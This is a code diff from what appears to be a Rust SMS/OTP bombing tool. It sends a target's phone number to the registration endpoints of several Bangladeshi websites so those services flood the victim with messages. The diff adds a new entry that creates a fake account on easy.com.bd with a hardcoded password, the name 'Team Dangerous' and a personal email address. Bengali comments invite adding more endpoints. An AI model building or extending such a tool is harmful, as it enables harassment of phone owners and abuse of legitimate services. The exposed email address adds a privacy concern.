@@ -190,14 +190,22 @@ fire("iEducation BD",
     json!({"mobile": &number})
 ),
 
-
 fire("Bangladeshi Matrimony",
     "https://www.bangladeshimatrimony.com/register/editmobileno.php",
     json!({"mobileNo": &number})
 ),
 
-
-            
+fire("easy com bd",
+    "https://core.easy.com.bd/api/v1/registration",
+    json!({
+        "password": "445566",
+        "password_confirmation": "445566",
+        "name": "Team Dangerous",
+        "mobile": &number, // Ekhane variable 'number' thikmoto link kora hoyeche
+        "referrer_key": "",
+        "email": "dangerousboytushar@gmail.com"
+    })
+),
         // ── এখানে নতুন API যোগ করো ──
         // fire("API নাম", "https://api.url", json!({"phone": &number})),
         // fire("API নাম", "https://api.url", json!({"mobile": &bd_full})),
